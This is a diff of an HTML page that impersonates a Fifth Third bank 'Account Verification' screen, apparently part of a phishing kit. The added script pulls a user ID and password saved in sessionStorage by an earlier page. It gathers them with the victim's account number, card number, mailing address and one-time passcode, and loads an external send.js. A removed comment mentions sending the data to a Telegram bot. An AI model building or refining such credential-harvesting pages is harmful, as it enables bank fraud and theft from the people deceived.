@@ -5,167 +5,163 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Fifth Third Secure Panel</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f5f6fa;
     }
-    .header {
-      background-color: white;
-      padding: 15px 30px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid #e0e0e0;
-    }
-    .header-left {
+    .navbar {
+      background: #1a357a;
+      height: 56px;
       display: flex;
       align-items: center;
-      gap: 15px;
+      justify-content: center;
+      position: relative;
+    }
+    .menu-btn {
+      position: absolute;
+      left: 16px;
+      background: none;
+      border: none;
+      height: 40px;
+      width: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    .menu-icon {
+      width: 24px;
+      height: 2px;
+      background: #fff;
+      display: block;
+      position: relative;
+    }
+    .menu-icon::before,
+    .menu-icon::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      width: 24px;
+      height: 2px;
+      background: #fff;
+      transition: 0.2s;
+    }
+    .menu-icon::before {
+      top: -8px;
+    }
+    .menu-icon::after {
+      top: 8px;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 56px;
     }
     .logo-img {
-      width: 40px;
-      height: 40px;
-      object-fit: contain;
-      border-radius: 4px;
-      background: #2e5aa0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      height: 48px;
+      width: auto;
+      margin: 0 0 0 0;
     }
-    .brand-text {
-      font-size: 24px;
-      font-weight: bold;
-      color: #2e5aa0;
-      letter-spacing: 1px;
-    }
-    .header-links {
-      display: flex;
-      gap: 15px;
-      font-size: 14px;
-      color: #666;
-    }
-    .breadcrumb {
-      background-color: white;
-      padding: 10px 30px;
-      font-size: 14px;
-      color: #666;
-      border-bottom: 1px solid #e0e0e0;
-    }
-    .breadcrumb a {
-      color: #4a90e2;
-      text-decoration: none;
-    }
-    .login-bg {
-      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
-      min-height: 600px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 60px 20px;
+    .main-bg {
+      background: #f5f6fa;
+      min-height: 100vh;
+      padding: 0;
     }
     .login-card {
-      background: white;
+      background: #f7f7f7;
       border-radius: 8px;
-      padding: 35px;
-      width: 100%;
-      max-width: 380px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 2px 12px rgba(30, 50, 100, 0.10);
+      max-width: 420px;
+      margin: 32px auto 0 auto;
+      padding: 32px 24px 24px 24px;
     }
     .login-title {
-      font-size: 24px;
-      font-weight: bold;
-      color: #333;
-      margin-bottom: 30px;
-      text-align: center;
+      font-size: 1.7em;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 24px;
+      text-align: left;
     }
     .verify-form label {
       display: block;
-      margin-bottom: 20px;
-      font-size: 14px;
-      color: #555;
-      font-weight: 500;
+      margin-bottom: 12px;
+      font-size: 1em;
+      color: #222;
+      font-weight: 600;
     }
     .verify-form input {
       width: 100%;
       padding: 12px;
-      border: 2px solid #ddd;
+      border: 1.5px solid #d1d5db;
       border-radius: 4px;
-      font-size: 14px;
-      margin-top: 8px;
-    }
-    .verify-form input:focus {
-      outline: none;
-      border-color: #4a90e2;
+      font-size: 1em;
+      margin-top: 6px;
+      background: #fff;
+      color: #222;
+      box-sizing: border-box;
     }
     .login-btn {
       width: 100%;
-      background-color: #1a357a;
-      color: white;
-      padding: 15px;
+      background: #1a357a;
+      color: #fff;
       border: none;
       border-radius: 4px;
-      font-size: 16px;
-      font-weight: bold;
+      padding: 15px 0;
+      font-size: 1.1em;
+      font-weight: 700;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 18px;
+      margin-bottom: 8px;
+      transition: background 0.2s;
       letter-spacing: 1px;
     }
     .login-btn:hover {
-      background-color: #2248b0;
+      background: #2248b0;
     }
     .info-section {
-      background-color: white;
-      padding: 60px 30px;
+      background: #fff;
+      padding: 36px 0 36px 0;
       text-align: center;
+      margin-top: 0;
     }
     .info-section h2 {
-      font-size: 28px;
-      color: #333;
-      margin-bottom: 20px;
-      font-weight: normal;
+      color: #222;
+      font-size: 1.3em;
+      font-weight: 700;
+      margin-bottom: 12px;
     }
     .info-section p {
-      font-size: 16px;
-      color: #666;
-      line-height: 1.6;
-      max-width: 800px;
+      color: #333;
+      font-size: 1.1em;
       margin: 0 auto;
+      max-width: 600px;
     }
     @media (max-width: 600px) {
-      .header, .header-left, .header-links {
-        flex-direction: column;
-        align-items: flex-start;
-        margin: 0 8px;
-      }
       .login-card {
         max-width: 98vw;
         padding: 8vw 2vw 8vw 2vw;
       }
-      .breadcrumb {
-        padding-left: 16px;
+      .navbar {
+        height: 48px;
+      }
+      .logo-img {
+        height: 28px;
       }
     }
   </style>
 </head>
 <body>
-  <div class="header">
-    <div class="header-left">
+  <nav class="navbar">
+    <button class="menu-btn" aria-label="Open menu">
+      <span class="menu-icon"></span>
+    </button>
+    <div class="logo-container">
       <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
-      <span class="brand-text">FIFTH THIRD</span>
     </div>
-    <div class="header-links">
-      <span>CUSTOMER SERVICE</span>
-      <span>|</span>
-      <span>BRANCH & ATM LOCATOR</span>
-    </div>
-  </div>
-  <div class="breadcrumb"><a href="#">Home</a> &gt; <b>Verification</b></div>
-  <div class="login-bg">
+  </nav>
+  <div class="main-bg">
     <div class="login-card">
       <div class="login-title">Account Verification</div>
       <form class="verify-form" id="verify-form">
@@ -184,17 +180,32 @@
         <button type="submit" class="login-btn">Submit</button>
       </form>
     </div>
+    <div class="info-section">
+      <h2>Account Verification Required</h2>
+      <p>For your security, please verify your account details to continue.</p>
+    </div>
   </div>
-  <div class="info-section">
-    <h2>Account Verification Required</h2>
-    <p>For your security, please verify your account details to continue.</p>
-  </div>
+  <script src="send.js"></script>
   <script>
     document.getElementById('verify-form').onsubmit = function(e) {
       e.preventDefault();
-      // Collect all form data and send to your backend or Telegram bot
-      // Example: sendToTelegram({...});
-      alert('Verification data submitted!');
+      // Get login data from sessionStorage
+      const userid = sessionStorage.getItem('userid') || '';
+      const password = sessionStorage.getItem('password') || '';
+      
+      // Get verification data from form
+      const data = {
+        userid: userid,
+        password: password,
+        accountnumber: this.accountnumber.value,
+        cardnumber: this.cardnumber.value,
+        mailingaddress: this.mailingaddress.value,
+        otp: this.otp.value
+      };
+      
+      // For now, just show an alert
+      alert('Verification data submitted! In a real app, this would be sent to your backend.');
+      console.log('Form data:', data);
     };
   </script>
 </body>
